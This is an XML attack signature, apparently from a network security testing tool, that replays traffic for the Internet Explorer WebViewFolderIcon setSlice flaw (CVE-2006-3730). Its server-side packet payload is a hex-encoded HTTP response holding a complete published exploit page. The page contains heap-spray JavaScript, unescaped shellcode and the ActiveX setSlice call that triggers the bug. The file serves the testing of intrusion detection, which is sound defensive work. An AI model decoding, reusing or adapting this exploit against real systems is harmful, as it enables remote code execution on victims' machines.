<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Internet Explorer Set Slice Exploit"/>
    <EngDesc display="true" value="This threat causes a flaw in Microsoft's Internet Explorer.  It affects the WebViewFolderIcon ActiveX object.  This attack would typically come from a malicious webserver listening on port 80."/>
    <Intent display="true">
      <item value="Corruption"/>
      <item value="Implementation_Exploitation"/>
      <item value="Unauthorized_Use"/>
      <item value="Command_Injection"/>
    </Intent>
    <Protocol display="true" value="HTTP"/>
    <Type_Of_Equipment display="true">
      <item value="Web_Browser"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Microsoft_Internet_Explorer"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Microsoft_Internet_Explorer_6.0"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://browserfun.blogspot.com/2006/07/mobb-18-webviewfoldericon-setslice.html"/>
    <CVEID display="true" value="CVE-2006-3730"/>
    <bugtraqID display="true" value="19030"/>
    <OSVDB display="true" value="27110"/>
    <Author display="true" value="Chuck McAuley"/>
    <ID display="true" value="2700ab8eef89ba95f71c69e2813a8857"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value="false"/>
    <SoftwareRevision display="true" value="1.4"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="false"/>
    <AccessVector display="false" value="local"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="632960787620665000"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1160507330" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="C"/>
      <for index="D"/>
      <for index="E"/>
      <for index="F"/>
      <for index="G"/>
    </for>
    <for index="B"/>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="B" Count="">
      <Ethernet srcMac="" destMac="" pktType="">
        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C203130204F637420323030362031353A32363A333320474D540D0A5365727665723A204170616368652F322E302E353420284665646F7261290D0A4C6173742D4D6F6469666965643A205765642C203034204F637420323030362032303A32323A343720474D540D0A455461673A20223164646463652D3665372D393466336330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20313736370D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D5554462D380D0A0D0A3C212D2D0A0A2E2E3A3A5B206A616D696B617A752070726573656E7473205D3A3A2E2E0A0A4D6963726F736F667420496E7465726E6574204578706C6F7265722057656256696577466F6C64657249636F6E2028736574536C69636529204578706C6F6974202830646179290A576F726B73206F6E20616C6C2057696E646F77732058502076657273696F6E7320696E636C7564696E67205350320A0A417574686F723A206A616D696B617A75200A4D61696C3A206A616D696B617A7540676D61696C2E636F6D0A0A42756720646973636F766572656420627920436F6D707574657220482044204D6F6F72652028687474703A2F2F7777772E6D65746173706C6F69742E636F6D290A0A4372656469743A206D65746173706C6F69742C20536B794C696E65640A0A696E766F6B65732063616C632E657865206966207375636365737366756C200A0A2D2D3E0A0A3C48544D4C3E0A3C424F44593E0A3C534352495054206C616E67756167653D226A617661736372697074223E0A0A0976617220686561705370726179546F41646472657373203D20307830353035303530353B0A09766172207061794C6F6164436F6465203D20756E657363617065280A092225753930393025753930393025754538464325753030343425753030303025753435384225753842334325753035374325753031373825753842454625753138344625753546384225753031323022202B0A092225753439454225753334384225753031384225753331454525753939433025753834414325753734433025754331303725753044434125754332303125754634454225753534334225753034323422202B0A092225754535373525753546384225753031323425753636454225753043384225753842344225753143354625754542303125753143384225753031384225753839454225753234354325754333303422202B0A092225754330333125753842363425753330343025754330383525753043373825753430384225753842304325753143373025753842414425753038363825753039454225753830384225753030423022202B0A092225753030303025753638384225753546334325754636333125753536363025754638383925754330383325753530374225754630363825753034384125753638354625754645393825753045384122202B0A092225754646353725753633453725753643363125753030363322293B0A097661722068656170426C6F636B53697A65203D2030783430303030303B0A09766172207061794C6F616453697A65203D207061794C6F6164436F64652E6C656E677468202A20323B0A09766172207370726179536C69646553697A65203D2068656170426C6F636B53697A65202D20287061794C6F616453697A652B30783338293B0A09766172207370726179536C696465203D20756E657363617065282225753035303525753035303522293B0A097370726179536C696465203D206765745370726179536C696465287370726179536C6964652C7370726179536C69646553697A65293B0A0968656170426C6F636B73203D2028686561705370726179546F41646472657373202D203078343030303030292F68656170426C6F636B53697A653B0A096D656D6F7279203D206E657720417272617928293B0A0A09666F722028693D303B693C68656170426C6F636B733B692B2B290A097B0A09096D656D6F72795B695D203D207370726179536C696465202B207061794C6F6164436F64653B0A097D0A0A20202009666F7220282069203D2030203B2069203C20313238203B20692B2B29200A097B0A09097472797B200A09090976617220746172203D206E657720416374697665584F626A656374282757656256696577466F6C64657249636F6E2E57656256696577466F6C64657249636F6E2E3127293B0A0909097461722E736574536C69636528307837666666666666652C20307830353035303530352C20307830353035303530352C3078303530353035303520293B200A09097D63617463682865297B7D0A097D0A0A0966756E6374696F6E206765745370726179536C696465287370726179536C6964652C207370726179536C69646553697A65290A097B0A09097768696C6520287370726179536C6964652E6C656E6774682A323C7370726179536C69646553697A65290A09097B0A0909097370726179536C696465202B3D207370726179536C6964653B0A09097D0A09097370726179536C696465203D207370726179536C6964652E737562737472696E6728302C7370726179536C69646553697A652F32293B0A090972657475726E207370726179536C6964653B0A097D0A0A3C2F5343524950543E200A0A3C2F424F44593E0A3C2F48544D4C3E0A0A23206D696C7730726D2E636F6D205B323030362D30392D32385D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
